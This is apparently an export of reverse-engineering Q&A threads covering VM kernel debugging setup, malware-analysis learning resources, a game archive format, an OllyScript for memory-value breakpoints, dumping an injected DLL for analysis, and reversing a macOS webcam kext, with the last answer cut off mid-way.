<p><strong>The layout:</strong> GNU/Linux host with Arch Linux distribution (even though the distro does not play a crucial role in this scenario), with VMWare Workstation 11 installed, hosting two MS Windows virtual machines - MS Windows 7SP1 x64 (the DEBUGGER), and MS Windows 8.0 x64 (the DEBUGGEE).</p>

<p><strong>The solution:</strong> I did quite a lot of Googling to figure this out, and there was some information here and there, but I was no able to find a solution that would work for my case.
Therefore, I have compiled my findings and a working step-by-step approach in the solution written below. Hopefully this will be also useful for someone else as well.</p>
","<p>This is a step-by-step approach, excluding the actual host system installation, VMware setup and Virtual Machine creation, since these are rudimentary steps and anyone willing to perform kernel debugging should be capable doing.
The approach is split into three parts - the VM hardware settings, MS Windows configuration, and establishing a debugging session.</p>

<h2>I. VM hardware settings</h2>

<ol>
<li><p>Start with the DEBUGGER VM (the one from where you will be connecting to the DEBUGGEE to perform kernel debugging). In virtual machine settings hardware tab click 'Add...' to add new 'Serial port' device. </p>

<p><a href=""https://i.stack.imgur.com/au2mO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/au2mO.png"" alt=""VMWare VM serial port""></a></p></li>
<li><p>Set Serial port type to 'Output to socket'.</p>

<p><a href=""https://i.stack.imgur.com/kSLkO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/kSLkO.png"" alt=""Output to socket""></a></p></li>
<li><p>Give the name to the Socket (named pipe) a one you desire in a writeable location. I chose a '/tmp' folder and give the name 'com1', so that the full path of the socket is '/tmp/com1'. Since the DEBUGGER will connect to a DEBUGGEE specify the direction of connection as 'From: Client' and 'To: A Virtual Machine'. Also, make sure the device status is selected as 'Connect at power on' unless you require otherwise.</p>

<p><a href=""https://i.stack.imgur.com/G3Ng5.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/G3Ng5.png"" alt=""Named pipe""></a></p></li>
<li><p>Once you click 'Finish' the DEBUGGER VM is prepared to use the serial connection.</p>

<p><a href=""https://i.stack.imgur.com/XeL7o.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/XeL7o.png"" alt=""Debugger ready""></a></p></li>
<li><p>Configure the DEBUGGEE VM (the one which will be debugged). In virtual machine settings hardware tab click 'Add...' to add new 'Serial port' device.Set Serial port type to 'Output to socket'. Give the name to the Socket exactly the same one as you set it for the DEBUGGER, in this case - '/tmp/com1'. Specify the direction of connection as 'From: Server' and 'To: A Virtual Machine'. Check that device status is selected as 'Connect at power on' unless you require otherwise.</p>

<p><a href=""https://i.stack.imgur.com/T3gFs.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/T3gFs.png"" alt=""Debuggee named pipe""></a></p></li>
<li><p>For the I/O mode make sure that 'Yield CPU on poll' is checked. Once done, this will prepare your VM to use the serial connection, and both VMs should be able to communicate over that.
<a href=""https://i.stack.imgur.com/mo4TG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/mo4TG.png"" alt=""Debuggee ready""></a></p></li>
</ol>

<h2>II. MS Windows configuration</h2>

<ol start=""7"">
<li><p>Start you DEBUGGEE machine in order to enable debugging mode on a MS Windows system. Launch the command prompt 'cmd.exe' as Administrator and execute the 'bcdedit' command to view the current boot settings.</p>

<p><a href=""https://i.stack.imgur.com/zd5La.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/zd5La.png"" alt=""bcdedit""></a></p></li>
<li><p>Execute (and adjust identifiers as needed) the following commands to create an additional boot option with debugging enabled:</p>

<blockquote>
  <p>bcdedit /copy {current} /d ""Windows 8 Debugging""</p>
  
  <p>bcdedit /set {ec04b3f3-16f4-11e6-b020-9ef119952d26} debug on</p>
  
  <p>bcdedit /set {ec04b3f3-16f4-11e6-b020-9ef119952d26} debugtype serial</p>
  
  <p>bcdedit /set {ec04b3f3-16f4-11e6-b020-9ef119952d26} debugport 1</p>
  
  <p>bcdedit /set {ec04b3f3-16f4-11e6-b020-9ef119952d26} baudrate 115200</p>
</blockquote>

<p>This should get your MS Windows DEBUGGEE be ready to boot in a debugging mode once restarted.</p></li>
</ol>

<h2>III. Establishing a debugging session</h2>

<ol start=""9"">
<li><p>Start the DEBUGGER VM. Download and install the MS Windows SDK with debugging tools. The Microsoft Windows SDK for Windows 7 can be found <a href=""https://www.microsoft.com/en-us/download/details.aspx?id=3138"" rel=""nofollow noreferrer"">here</a>. Run the WinDbg and choose 'File/Kernel Debug (Ctrl+K)' to configure a debugging session over serial connection. In kernel Debugging settings COM tab, set baud rate to 115200 and port - com1 (or the name you specified). Once you click OK, the WinDbg will start waiting on com1 for incoming debugging sessions.</p>

<p><a href=""https://i.stack.imgur.com/8HLQw.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8HLQw.png"" alt=""WinDbg Setup""></a></p></li>
<li><p>Start the DEBUGGEE VM. Make sure you choose the ""Windows 8 Debugging"" boot option to start the machine in the debugging mode.</p></li>
<li><p>On your DEBUGGER VM in WinDbg you should see an incoming kernel debugging connection. Select 'Debug/Break (Ctrl+Break)' to issue an interrupt and start debugging the kernel.</p>

<p><a href=""https://i.stack.imgur.com/dp0VN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dp0VN.png"" alt=""Kernel debugging connection""></a></p></li>
</ol>

<p>These steps should be enough to get the Kernel Debugging session over serial connection between two MS Windows VMs on a GNU/Linux host up and running.</p>
","13140"
"Intro to reverse engineering","1203","","<p>I would like learn how to reverse engineer malwares. I have a very small experience reverse engineering windows applications. I would like to know if there are good resources that is helpful in learning this.  </p>
","<p>Have a look at <a href=""https://reverseengineering.stackexchange.com/a/267/225"">this answer</a>. It includes beginner malware training videos.</p>

<p>Not familiar with malware myself, I do often see the following books recommended in answers:</p>

<ul>
<li><p><a href=""http://rads.stackoverflow.com/amzn/click/0470613033"" rel=""nofollow noreferrer"">Malware Analyst's Cookbook</a></p>

<blockquote>
  <p>Security professionals will find plenty of solutions in this book to the problems posed by viruses, Trojan horses, worms, spyware, rootkits, adware, and other invasive software. Written by well-known malware experts, this guide reveals solutions to numerous problems and includes a DVD of custom programs and tools that illustrate the concepts, enhancing your skills.</p>
</blockquote></li>
<li><p><a href=""http://rads.stackoverflow.com/amzn/click/1593272901"" rel=""nofollow noreferrer"">Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software</a></p>

<blockquote>
  <p>For those who want to stay ahead of the latest malware, Practical Malware Analysis will teach you the tools and techniques used by professional analysts. With this book as your guide, you'll be able to safely analyze, debug, and disassemble any malicious software that comes your way.</p>
</blockquote></li>
</ul>

<p>Keeping an eye on <a href=""http://www.reddit.com/r/malware"" rel=""nofollow noreferrer"">/r/Malware</a> over at Reddit can also be a good idea. It's a place where allot of analysis reports are posted. Which you can look at as small tutorials.</p>

<p>-edit-</p>

<p>Another source I remembered is: <a href=""http://fumalwareanalysis.blogspot.nl/p/malware-analysis-tutorials-reverse.html"" rel=""nofollow noreferrer"">Dr. Fu's Malware analysis tutorials</a></p>

<blockquote>
  <p>It describes building and configuring a malware lab using virtual machines and then continues analyzing a real piece of malware.</p>
</blockquote>
","2882"
"Extracting files from .data and .toc files","1201","","<ul>
<li><a href=""https://mega.co.nz/#!0MJgGAAL!ArUvamiuumle0uR0HJNDWjebI3g_R12iBLVq-geuZFE"" rel=""nofollow"">core.toc</a> [87 KB]</li>
<li><a href=""https://mega.co.nz/#!hEwlGD4Z!RSA3zXEVk41gjbzdfOKCez3EjI9BZChvPr34VR10Ocg"" rel=""nofollow"">core.data</a> [130 MB]</li>
</ul>

<p>the <code>.toc</code> is a table of contents files that always starts with the header 1rrs.
It also contains directory and file paths at offsets that will relate to the data file.</p>

<p>Where should I start trying to use the <code>.toc</code> to extract from the <code>.data</code> file?</p>
","<p>Full Disclosure is always appreciated. This seems to be a (""the""?) data file for FASA Studio's ""Shadowrun"". Anyway, the data file contains enough recognizable items to get a good start (PNGs, Unicode text). Data seems to be aligned on 16 bytes, padded with what seems to be random trash.</p>

<p>PNG images are a good start; you can extract them 'manually' (I used <a href=""http://www.suavetech.com/0xed/"" rel=""nofollow noreferrer"">0xED</a>) and see if they are well-formed. The few I tried were, and the all-but-one last data block should be a PNG image, according to the toc file. I located it at <code>0x82A72D0</code>, with a length of <code>0x2E231</code> bytes.</p>

<p><img src=""https://i.stack.imgur.com/WDvNG.png"" alt=""the very last PNG in core.data""></p>

<p>Then I checked the data around the last PNG file <em>name</em> in <code>core.toc</code> for these bytes. Bingo - not a huge challenge.</p>

<p>The initial part of the toc file is unknown but may be a fast look-up table. I didn't cross-reference this any further with what follows. After that, the following data can be found per each file:</p>

<pre><code>4 bytes   length (little endian)
4 bytes   offset
8 bytes   unknown (perhaps checksum, perhaps file data/time, who knows?)
3 bytes   name length -- possibly only the first 2 though, 3 bytes is rare #
x bytes   name
</code></pre>

<p>Right after the block of file names more stuff appears, I couldn't think of a use for it. You could extract all file names, count them, and see if this is relevant. It seems it isn't as the file name block contains everything you were looking for.</p>

<h2>Edit:</h2>

<p># Ah-- for the first file, this <code>name length</code> is <code>0x0E 0x00 0x01</code>. Seems the third byte indicates something else, then. I found 2 so far with a <code>0x01</code>, both are '<em>pathless</em>' files.</p>
","3162"
"How to cause program to stop execution when a particular value is found in memory","1201","","<p>I am new to reverse engineering. This is my problem:
I am running a program and I know a value '<strong>X</strong>' will be calculated during execution.
Now how do i set the IDA or ollydbg to break when value X appears for the first time in the memory. (I guess it is similar to Memory/Data Breakpoints)
Please help.</p>
","<p>Well, I was tying few weeks ago to implement an ollyscript which triggers conditional beakpoints on each line where a desired alpha/numerical value is found.</p>

<p>This program gives the user the choice of following one of 3 methods:</p>

<p>1- Trace methode (which works with numbers)</p>

<p>2- Memory breakpoints </p>

<p>3- Smart research by setting unconditional breakpoints (works by two passes)</p>

<blockquote>
  <ul>
  <li>Golden script:</li>
  </ul>
</blockquote>

<pre><code>COE 
LC  
log "" This script is realised by AGAWA001 of StackExchange ""    
log "" This script should be executed on ODbgScript version +1.82.6"" 
log "" This script must rerun twice atleast in case of smartresearch""    
log "" you must restart your program once terminated to clear useless breakpoints""   
log "" This script is used to check existence of an alpha/numeric value in memory""   
log "" Unicode strings arent suppoted try to input first two unicode characters as number""   
log "" in case when script stops, press spacebar focused on script window to force it to run""    
log "" This script removes all beakpoints prealably set up and changes labels from command lines""    
log "" To run this script as quick as possible, ollydbg window is prefered to be minimized during execution ""    
log "" All insider windows (log window,bp window,memory ,...) must be closed apart script window to ensure shortest runtime"" 
log "" Trace procedure can encounter T-flag error, in this case try to get a grasp on it by binding esc key focused on script window""    
log "" Some debuggers dont support ask command, so values must be injected manually and carefully instead of userprompt command in same line""    

log ""--------------------------------------------------------------------------------------""    
log "" This is beta version, Contact me whether you find any bugs, regards."" 
log ""--------------------------------------------------------------------------------------""    

var str 
var tmp 
var start   
var finish  
var addr    
var ending  
var beginning   
var val 
var value   
var swtch   
var stack   
var stackend    
var buff    
var offset  
var dll 
var processkill 
mov processkill,0   
mov offset,4    
alloc 1000                          
mov buff, $RESULT   
mov offst,ff    
GMEMI esp, MEMORYBASE   
mov stack,$RESULT   
GMEMI $RESULT, MEMORYSIZE   
mov stackend,$RESULT    
add stackend,stack  
gmi eip,MODULEBASE  
mov start,$RESULT   
mov finish,$RESULT  
gmi eip,MODULESIZE  
add finish,$RESULT  
gcmt finish 
cmp $RESULT,""complete""  
je bypass   
cmp $RESULT,""done""  
je exit 
preop eip   
gcmt $RESULT    
cmp $RESULT,""ready"" 
je check2   
preop eip   
gcmt $RESULT    
mov val,$RESULT 
len $RESULT 
ifg $RESULT,1   
atoi val    
mov val,$RESULT 
mov dll,0   
ife val&gt;&gt;1f,1   
mul val,-1  
mov addr,eip-val    
jmp boucl   
else    
mov addr,eip+val    
jmp boucl2  
endif   
endif   
check2: 
mov processkill,1   
bypass: 
mul offst,10    
ask ""Enter value to look for (preceded by 'str:' in case of a formatted string ex: str:password ) "" 
add offst,buff  
cmp $RESULT, 0  
je  theend  
mov str,$RESULT 
mov value,$RESULT   
str str 
len str 
mov tmp,$RESULT 
cmp tmp,5   
jb ok   
str str 
scmp  str, ""str:"", 4    
jne ok  
buf str 
mov [esp-100],str   
mov value,0 
mov value,[esp-100+4]   
keepon: 
mov [buff+offset-4],[esp-100+offset]    
add offset,4    
cmp tmp,offset  
jbe nok 
jmp keepon  
ok: 
mov [buff+offset-4],value   
nok:    
cmp processkill,1   
je loop 
MSGYN ""do you want to set breakpoints on dlls ? ""   
ifeq $RESULT, 0 
mov dll,0   
else    
mov dll,1   
endif   
cmp $RESULT,2   
je theend   
jmp firstcheck  
returnback: 
mov val,value   
MSGYN ""do you want to trace the information ? press no to proceed smart research ""  
cmp $RESULT, 2  
jne traced  




firstcheck: 
mov val,0   
mov addr,0  
mov tmp,0   
mov str,0   
repeat: 
mov [2*str+offst],c0+str    
add str,1   
cmp str,3   
jl repeat   
mov str,value   
buf str 
findmem str, addr   
cmp $RESULT, 0  
je cont 
mov addr,$RESULT    
itoa addr   
log ""value found in memory at "" + $RESULT   
ifeq tmp,0  
msgyn ""value found in memory would you like to set memory breakpoint there (see log) ?"" 
mov tmp,$RESULT 
cmp $RESULT,2   
je returnback   
endif   
mov val,addr    
GMEMI addr, MEMORYBASE  
mov addr,$RESULT    
gmi addr,PATH   
add buff,300    
mov [buff],$RESULT  
len [buff]  
mov str,$RESULT 
add str,buff    
sub str,3   
cmp [str],""dll"" 
sub buff,300    
je cont 
GMEMI addr, MEMORYSIZE  
cmp val,start   
jb performm 
cmp val, finish 
ja performm 
add addr,$RESULT    
jmp repeat  
performm:   
cmp val,stack   
jb performm2    
cmp val, stackend   
ja performm2    
mov addr,val    
mov str,4   
jmp changeplan  
performm2:  
mov str,$RESULT     
sub str,1   
changeplan: 
cmp tmp,0   
je saut 
bprm addr,str   
mov val,[buff+400]  
mov [buff+404+val],addr 
mov [buff+408+val],str  
add val,8   
mov [buff+400],val  
saut:   
add addr,str    
cmp tmp,0   
je repeat   
jmp cont    





traced: 
cmp $RESULT, 0  
je smartsearch  



itoa val    
mov val,$RESULT 
concatenate:    
len val 
cmp $RESULT,8   
je stopit   
mov val,""0""+val 
jmp concatenate 
stopit: 
mov str, "" EAX=="" + val+ "" | EBX=="" + val+ "" | ECX=="" + val+ "" | EDX=="" + val+ "" | ESI=="" + val+ "" | EDI=="" + val   
log ""---------------------value to trace is---------------------------"" 
log str 
log ""-----------------------------------------------------------------"" 
ticnd str   
mov swtch,1 
jmp passover    
trace:  
precontinue:    
sti 
mov addr,eip    
ti  
cmp eip,addr    
je precontinue  
passover:   
ifeq dll,0  
cmp eip,start   
jb run  
cmp eip,finish  
ja run  
jmp continue    
run:    
rtr 
sti 
cmp eip,start   
jb run  
cmp eip,finish  
ja run  
jmp trace   
endif   
continue:   
preop eip   
mov addr,$RESULT    
GOPI addr, 1, DATA  
cmp $RESULT,value   
je detected1    
GOPI addr, 2, DATA  
cmp $RESULT,value   
je detected2    
GOPI addr, 1, ADDR  
cmp $RESULT,7   
ja checkval 
mov val,[buff]  
cmp swtch,1 
je trace    
jmp redo2   
checkval:   
mov tmp,0   
cmp [$RESULT],value 
and [offst+1],ff00ff00  
mov val,7   
je affect   
add tmp,1   
cmp [$RESULT+1],value   
je affect   
add tmp,1   
cmp [$RESULT+2],value   
je affect   
add tmp,1   
cmp [$RESULT+3],value   
je affect   
GOPI addr, 2, ADDR  
cmp $RESULT,8   
add [offst+1],400050    
add [offst+1],val   
add [offst+3],val   
jb compare  
jmp round2  
affect: 
add [offst+1],400050    
add [offst+1],val   
add [offst+3],val   
itoa $RESULT+tmp    
mov addr,$RESULT    
mov tmp,0   
mov val, buff+100   
jmp concat  
round2: 
mov tmp,0   
cmp [$RESULT],value 
je affect   
add tmp,1   
cmp [$RESULT+1],value   
je affect2  
add tmp,1   
cmp [$RESULT+2],value   
je affect2  
add tmp,1   
cmp [$RESULT+3],value   
je affect2  
cmp swtch,1 
je trace    
jmp redo2   
affect2:    
itoa $RESULT+tmp    
mov addr,$RESULT    
mov tmp,0   
mov val, buff+100   
jmp concat  
compare:    
mov val,[buff]  
mov [buff+e08],31303041 
cmp swtch,1 
je trace    
jmp redo2   
detected1:  
GOPI addr, 1, ADDR  
jmp branch  
detected2:  
GOPI addr, 2, ADDR  
branch:     
mov tmp,$RESULT 
mov str,addr    
itoa str    
mov str,$RESULT 
itoa value  
cmp tmp,0   
je eaxx 
cmp tmp,1   
je ecxx 
cmp tmp,2   
je edxx 
cmp tmp,3   
je ebxx 
cmp tmp,6   
je esii 
cmp tmp,7   
je edii 
log ""eip=""+str  
mov addr,tmp    
mov tmp,0   
mov val, buff+100   
itoa addr   
mov addr,$RESULT    
mov str,0   
concat: 
mov str,0   
mov str,[buff+tmp]  
itoa str    
mov str,$RESULT 
mov [val] , ""["" 
mov [val+1],  addr  
len [val]   
mov [val+$RESULT], ""] == ""  
mov [val+$RESULT+5], str    
add val,$RESULT+5   
len [val]   
mov [val+$RESULT], ""&amp;""  
add val,$RESULT+1   
mov [val],0 
add tmp,1   
atoi addr   
mov addr,0  
mov addr,$RESULT    
add addr,1  
cmp offset-4,tmp    
jbe dobp    
cmp [addr],[buff+tmp]   
jne dobp2   
itoa addr   
mov addr,$RESULT    
jmp concat  
dobp:   
itoa addr   
log ""found at :"" + $RESULT  
msgyn ""perfect value found in memory ,would you like to clear all previous conditional breakpoints? press no to keep all breakpoints, cancel to stop script (see log window)""   
ifeq $RESULT,1  
bc  
else    
ifeq $RESULT,2  
jmp theend  
endif   
endif   
dobp2:  
mov [val-1],0   
mov [buff+e04],57414741 
gstr buff+100   
BPCND eip, $RESULT  
cmt finish,""done""   
itoa eip    
LBL eip,""no""+$RESULT    
fill buff+100, val-buff-100, 0  
mov val,[buff]  
cmp swtch,1 
je trace    
jmp redo2   
eaxx:   
log ""eip=""+str  
BPCND eip, ""EAX == "" + $RESULT  
gcmt start  
cmp $RESULT,""done""  
jne check4  
gcmt finish 
cmp $RESULT,""complete""  
je check4   
itoa eip    
LBL eip,""no""+$RESULT    
check4: 
cmp swtch,1 
je trace    
jmp redo2   
ebxx:   
log ""eip=""+str  
BPCND eip, ""EBX == "" + $RESULT  
gcmt start  
cmp $RESULT,""done""  
jne check3  
gcmt finish 
cmp $RESULT,""complete""  
je check3   
itoa eip    
LBL eip,""no""+$RESULT    
check3: 
gcmt start  
cmp $RESULT,""done""  
jne check5  
gcmt finish 
cmp $RESULT,""complete""  
je check5   
itoa eip    
LBL eip,""no""+$RESULT    
check5: 
cmp swtch,1 
je trace    
jmp redo2   
ecxx:   
log ""eip=""+str  
BPCND eip, ""ECX == "" + $RESULT  
gcmt start  
cmp $RESULT,""done""  
jne check6  
gcmt finish 
cmp $RESULT,""complete""  
je check6   
itoa eip    
LBL eip,""no""+$RESULT    
check6: 
cmp swtch,1 
je trace    
jmp redo2   
edxx:   
log ""eip=""+str  
BPCND eip, ""EDX == "" + $RESULT  
gcmt start  
cmp $RESULT,""done""  
jne check7  
gcmt finish 
cmp $RESULT,""complete""  
je check7   
itoa eip    
LBL eip,""no""+$RESULT    
check7: 
cmp swtch,1 
je trace    
jmp redo2   
esii:   
log ""eip=""+str  
BPCND eip, ""ESI == "" + $RESULT  
gcmt start  
cmp $RESULT,""done""  
jne check8  
gcmt finish 
cmp $RESULT,""complete""  
je check8   
itoa eip    
LBL eip,""no""+$RESULT    
check8: 
cmp swtch,1 
je trace    
jmp redo2   
edii:   
log ""eip=""+str  
BPCND eip, ""EDI == "" + $RESULT  
gcmt start  
cmp $RESULT,""done""  
jne check9  
gcmt finish 
cmp $RESULT,""complete""  
je check9   
itoa eip    
LBL eip,""no""+$RESULT    
check9: 
cmp swtch,1 
je trace    
jmp redo2   



cont:   

log ""-----------------end memorybreakpoints---------------------""   
loop:   
COE 
erun    


ifeq dll,0  
cmp eip,start   
jb run2 
cmp eip,finish  
ja run2 
jmp continue2   
run2:   
BPMC    
redoit: 
COE 
erun    
cmp eip,start   
jb redoit   
cmp eip,finish  
ja redoit   
mov val,0   
mov str,buff+404    
bpaffect:   
bprm [str],[str+4]  
add str,8   
add val,8   
cmp [buff+400],val  
jne bpaffect    
jmp loop    
continue2:  
endif                           



mov addr, eip   
GOPI addr, 1, DATA  
cmp $RESULT, value  
je detected1    
GOPI addr, 2, DATA  
cmp $RESULT, value  
je detected2    
GOPI addr, 1, ADDR  
cmp $RESULT,7   
ja checkval 
GOPI addr, 2, ADDR  
cmp $RESULT,8   
jb redo2    
jmp round2  
detected1:  
GOPI addr, 1, ADDR  
jmp branch  
detected2:  
GOPI addr, 2, ADDR  
jmp branch  



ifeq dll,0  
cmp eip,start   
jb run2 
cmp eip,finish  
ja run2 
jmp continue2   
run2:   
BPMC    
redoit: 
COE 
rtr 
sti 
cmp eip,start   
jb redoit   
cmp eip,finish  
ja redoit   
mov val,0   
mov str,buff+404    
bpaffect:   
bprm [str],[str+4]  
add str,8   
add val,8   
cmp [buff+400],val  
jne bpaffect    
jmp loop    
continue2:  
endif                           


redo2:  

jmp loop    



smartsearch:    
mov dll,0   
mov addr, eip   
boucl:  
mov str,addr    
preop addr  
ifeq $RESULT,addr-1 
preop $RESULT   
mov addr,$RESULT    
jmp boucl   
endif   
mov addr,$RESULT    
cmp addr,str    
je finishit 
opcode addr 
mov [buff+200],$RESULT_1    
mov str,buff+200    
ckecknext:  
add str,1   
scmp  [str], ""["", 1 
je dobreak  
cmp [str],0 
je boucll   
jmp ckecknext   
dobreak:    
bp  addr    
mov dll,addr-eip    
itoa dll    
mov dll,$RESULT 
preop eip   
cmt $RESULT,dll 
mov val,addr    
itoa val    
LBL val,""yes""+$RESULT   
boucll: 
gstr buff+200   
len $RESULT 
fill buff+200, $RESULT, 0   
jmp boucl   

finishit:   
mov dll,0   
mov start,addr  
mov addr, eip   
boucl2: 
GCI addr, size  
cmp $RESULT,0   
je loopp    
mov addr,addr +$RESULT  
preop addr  
ifeq $RESULT,addr-1 
jmp boucl2  
endif   
opcode addr 
cmp addr,finish 
jae loopp   
mov [buff+200],$RESULT_1    
mov str,buff+200    
ckecknext2: 
add str,1   
scmp  [str], ""["", 1 
je dobreak2 
cmp [str],0 
je boucll2  
jmp ckecknext2  
dobreak2:   
mov dll,addr-eip    
itoa dll    
mov dll,$RESULT 
preop eip   
cmt $RESULT,dll 
GCI addr, size  
bp  addr    
mov val,addr    
itoa val    
LBL val,""yes""+$RESULT   
boucll2:    
gstr buff+200   
len $RESULT 
fill buff+200, $RESULT, 0   
jmp boucl2  

loopp:  
preop eip   
cmt $RESULT,""ready"" 
jmp loop    

exit:   
mov val,start   
again:  
ifeq val,finish 
jmp lafin   
endif   
endif   
mov str,""""  
glbl val    
ifNeq $RESULT,0 
MOV str,$RESULT 
endif   
scmp str,""yes"",3    
jne skipit  
bc val  
lbl val,""""  
skipit: 
GCI val, size   
mov val,val+$RESULT 
jmp again   
lafin:  
preop eip   
cmt $RESULT,""""  
cmt finish,""complete""   
msg ""finished, save a copy of ./udd/&lt;exename&gt;.udd to store script results""  
theend: 
Ret                     
</code></pre>

<ul>
<li>May you report me any bugs you find to this email atagawa@gmail.com -best regards-</li>
</ul>
","9422"
"How to dump a DLL not listed using Process Explore and similar tools","1199","","<p>I am trying to reverse engineer a DLL that may contain malware. One thing I noticed is that it hides itself from the DLL <code>LDR_MODULE</code> list. So, when I use Ollydbg or smiler tools I do not see it and cannot dump it. </p>

<p>I don't have the DLL file. I just have an executable file that injects the DLL into a certain process.</p>
","<p>I'll list some ways to do it. Obviously there are many others and most likely other fellows here will add. Start with those as they are ones of the mostly used.</p>

<ol>
<li>While debugging a malicious process, BP on <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx"" rel=""nofollow"">WriteProcessMemory</a>/NtMapViewOfSection API. Those are used to copy/map potential DLL into the remote process. Before the copying or mapping is done, you can dump the buffer to disk. Check the manual of the above APIs to find the local buffer which will be copied to remote process.</li>
<li>Alternatively, if you have s little understanding what malicious code is doing you can follow it by inspecting the log of <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow"">procmon</a>. Once you see something in the log that is 100% done by the mal-DLL, you can open that log line and inspect the stack. The stack will tell you at what page the mal-DLL resides. If you know at what memory page the DLL resides in the infected process, you can use for example <a href=""http://processhacker.sourceforge.net/"" rel=""nofollow"">Process Hacker</a> for dumping this specific memory page by clicking on the process and inspecting memory tab.</li>
<li>Alternatively, you can dump the whole memory of the infected machine and use tool - <a href=""https://code.google.com/p/volatility/"" rel=""nofollow"">Volatility</a> to inspect the memory of a specific process or all the processes.</li>
</ol>
","3337"
"What are some methods to reversing a .kext?","1197","","<p>I recently discovered there is no native Linux driver for the Web Cam in my computer.  However, there is a person who has taking the initiative to start a <a href=""https://github.com/patjak/bcwc_pcie"" rel=""nofollow"">github project</a> for a driver.  That being said, I was able to get the web cam working in a qemu guest OS running OS X (10.10), and now I'm at the point where I would like to start to analyze the .kext is question.</p>

<p>A quick google search revealed <a href=""https://inficererk.wordpress.com/2014/01/30/debugging-kext-with-vmware-gdb-osx-10-8-4/"" rel=""nofollow"">this</a>, but I am not sure if this method would still apply to OS X (10.10).</p>

<p>Should I try to debug the .kext on a running system, or should I just copy the .kext to my host OS (Linux) and start analyzing in a disassembler such as Hopper / Radare2?</p>

<p>Also I should note, from what I understand, most OS X kernel extensions are written in C++ while most if not all Linux drivers are written in C.  So would I be wasting my time reversing / analyzing this .kext?  Any help on this subject matter would be greatly appreciated.</p>
","<p><strong>Answering Your Question Directly</strong>: </p>

<p>You can reverse Kernal Extensions with IDA Pro, Radare2, GDB or whatever dissasembler you would like. Yes, you will have to learn what C++ structures look like once disassembled. I can't answer the ""static analysis or dynamic analysis?"" question directly, since often the answer is ""both, depending on exactly what you want."" Some Reverse Engineers start with the static, and some start with the dynamic. </p>

<p>I <em>personally</em> would start with a static analysis tool because: </p>

<ul>
<li>I imagine the driver is rather large. If you don't know what you are looking for, you could spend a long, long time single stepping. </li>
<li>You will get more out of this by searching over and analyzing specific function calls in the driver. Their use will most likely be self evident in the driver once you see their relation to other functions</li>
<li>There isn't an element of obfuscation here. Nor do you need to check the <em>exact</em> position of anything in memory. </li>
<li>You are trying to rewrite a driver from this anyway, seeing things in a format that resembles source code will help that process. </li>
</ul>

<p>But to each his own. Given enough time I would go through both processes just for the sake of knowing. Also, to pull this off correctly, you will need to learn a little about Macintosh system programming. </p>

<p>There is a class at recon on this subject this year: <a href=""http://www.recon.cx/2015/trainingosx.html"" rel=""noreferrer"">http://www.recon.cx/2015/trainingosx.html</a> (once the white paper is published, it should be linked in this answer) </p>

<p>Here is a snippet from a book on kernal exploitation that takes you through the basics of reversing a kext with IDA pro: </p>

<p><a href=""https://books.google.com/books?id=G6Zeh_XSOqUC&amp;pg=PA215&amp;lpg=PA215&amp;dq=IDA+pro+kernel+extension+mac&amp;source=bl&amp;ots=0y3XXMAgqH&amp;sig=6HkJnGKmW7OugZiHo42DwOYtaY8&amp;hl=en&amp;sa=X&amp;ei=93nbVIe_BYWVyQT4z4HgDw&amp;ved=0CEIQ6AEwBQ#v=onepage&amp;q=IDA%20pro%20kernel%20extension%20mac&amp;f=false"" rel=""noreferrer"">https://books.google.com/books?id=G6Zeh_XSOqUC&amp;pg=PA215&amp;lpg=PA215&amp;dq=IDA+pro+kernel+extension+mac&amp;source=bl&amp;ots=0y3XXMAgqH&amp;sig=6HkJnGKmW7OugZiHo42DwOYtaY8&amp;hl=en&amp;sa=X&amp;ei=93nbVIe_BYWVyQT4z4HgDw&amp;ved=0CEIQ6AEwBQ#v=onepage&amp;q=IDA%20pro%20kernel%20extension%20mac&amp;f=false</a></p>

<p><strong>Regarding this particular camera:</strong> </p>

<p>It seems that the camera in question is referenced in the conversation found here: <a href=""https://bugzilla.kernel.org/show_bug.cgi?id=71131"" rel=""noreferrer"">https://bugzilla.kernel.org/show_bug.cgi?id=71131</a></p>

<p>Essentially, this camera speaks over <em>PCI</em> because it does not compress its video before being sent to the system. The thread states that there is already a project underway to make a driver for the camera, which can be found at <a href=""https://github.com/patjak/bcwc_pcie"" rel=""noreferrer"">https://github.com/patjak/bcwc_pcie</a></p>

<p>The wiki on this site is informative, and lists some of the issues with reverse engineering this sort of driver. The wiki page found at: <a href=""https://github.com/patjak/bcwc_pcie/wiki/Mac-OS-X-driver"" rel=""noreferrer"">https://github.com/patjak/bcwc_pcie/wiki/Mac-OS-X-driver</a> gives some great ideas for where you should be starting on the mac side of things. </p>

<p>Based on their to do list, you might want to focus on helping rip the device firmware from the device itself. </p>

<p><strong>Regarding developing your own driver:</strong> </p>

<p>I would start from a different direction, and reverse engineer the camera itself. Depending on the complexity of your camera, you may be able to speak to it directly without a driver over serial. You might also be able to open up the camera, and speak to it directly via a debug port (think JTAG, or even simpler.) </p>

<p>The first time I read your question, I thought you meant a small camera outside your computer, but I am guessing you mean a camera built into your laptop. I think in that case, you could just adapt a driver from an existing webcam, and see where it dies. I believe these cameras are fairly generic bits of hardware at this point. </p>

<p>Most webcam's on Linux use this driver: <a href=""https://help.ubuntu.com/community/UVC"" rel=""noreferrer"">https://help.ubuntu.com/community/UVC</a>, and potentially you can just run this driver and see where it dies/can't communicate with the camera. At any rate, watching the actual communications with the camera will give you a much better idea of what you need to do. </p>

<p><strong>Regarding the Utility of reversing a Macintosh Kernal extension:</strong></p>

<p>I would be less worried about the c++/C difference versus differences in system libaries, and the system call interface. It certainly wouldn't hurt to analyze the driver for your own edification, but you may find that it gets most of its work done by calling mac system libraries that don't work the same way in linux. You will be most interested in reading the parts of the driver that define the communication with the camera. At any rate, you wont be able to directly convert the KeXT into a Linux Kernal Module. </p>

<p><strong>My Final Advice:</strong></p>

